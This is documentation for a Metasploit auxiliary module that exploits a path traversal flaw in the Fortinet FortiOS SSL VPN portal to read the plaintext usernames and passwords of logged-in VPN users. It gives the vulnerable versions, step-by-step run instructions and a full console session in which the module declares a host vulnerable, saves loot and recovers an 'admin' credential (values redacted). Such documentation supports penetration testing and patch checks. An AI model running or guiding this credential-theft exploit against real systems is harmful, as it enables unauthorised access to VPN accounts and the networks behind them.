## Vulnerable Application
Fortinet FortiOS versions 5.4.6 to 5.4.12, 5.6.3 to 5.6.7 and 6.0.0 to 6.0.4 are vulnerable to
a path traversal vulnerability within the SSL VPN web portal which allows unauthenticated attackers
to download FortiOS system files through specially crafted HTTP requests.

This module exploits this vulnerability to read the usernames and passwords of users currently logged
into the FortiOS SSL VPN, which are stored in plaintext in the `/dev/cmdb/sslvpn_websession` file on
the VPN server.

## Verification Steps

1. Start msfconsole
2. Do: use auxiliary/gather/fortios_vpnssl_traversal_creds_leak
3. Do: set RHOSTS [IP]
4. Do: set RPORT 10443
5. Do: run

## Options

### DUMP_FORMAT

Dump format. (Accepted: raw, ascii)

### STORE_CRED

If set, then store gathered credentials into the Metasploit creds database.

## Scenarios

### FortiOS 6.0

```
msf6 > use auxiliary/gather/fortios_vpnssl_traversal_creds_leak
msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > show options

Module options (auxiliary/gather/fortios_vpnssl_traversal_creds_leak):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_FORMAT  raw              yes       Dump format. (Accepted: raw, ascii)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        10443            yes       The target port (TCP)
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   STORE_CRED   true             no        Store credential into the database.
   TARGETURI    /remote          yes       Base path
   THREADS      1                yes       The number of concurrent threads (max one per host)
   VHOST                         no        HTTP server virtual host

msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > set RHOSTS *redacted*
RHOSTS => *redacted*
msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > run

[*] https://*redacted*:10443 - Trying to connect.
[+] https://*redacted*:10443 - Vulnerable!
[+] https://*redacted*:10443 - File saved to /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
[+] https://*redacted*:10443 - 1 credential(s) found!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > creds
Credentials
===========

host            origin          service            public  private    realm  private_type  JtR Format
----            ------          -------            ------  -------    -----  ------------  ----------
*redacted*  *redacted*  10443/tcp (https)  admin   *redacted*         Password

msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
[*] exec: cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt

var fgt_lang =
�/V^Pҽ�w���V^��V^��V^*redacted*admin*redacted*RemoteUSersfull-accessroot�бmsf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) >

```
